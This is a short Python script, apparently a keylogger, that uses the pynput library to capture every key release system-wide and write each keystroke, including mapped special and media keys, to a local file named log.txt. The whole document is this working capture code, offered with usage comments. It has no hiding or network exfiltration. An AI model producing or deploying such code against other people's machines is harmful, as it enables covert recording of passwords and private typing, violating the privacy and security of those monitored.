from pynput.keyboard import Listener
import logging

logging.basicConfig(filename='log.txt', level=logging.DEBUG, format='%(message)s')


# If you want to log each key in one line use this
def last_char():
    logging.StreamHandler.terminator = ''


# Shift, Enter etc. will log after releasing the key.
# If you want to log them when it pressed change all on_release to on_pressed.
def on_release(key):
    if len(str(key)) == 3:
        logging.info(str(key)[1:2])  # a
    elif 'Key.' in str(key):
        logging.info(str(key)[4:])  # Shift
    elif '17' in str(key):
        if '173' in str(key):
            logging.info('Mute')
        elif '175' in str(key):
            logging.info('Volume Wheel')
        elif '176' in str(key):
            logging.info('Next')
        elif '177' in str(key):
            logging.info('Previous')
        elif '178' in str(key):
            logging.info('Stop')
        elif '179' in str(key):
            logging.info('Play/Pause')
    else:
        logging.info(str(key))

    # last_char()

# last_char()

with Listener(on_release=on_release) as listener:
    listener.join()
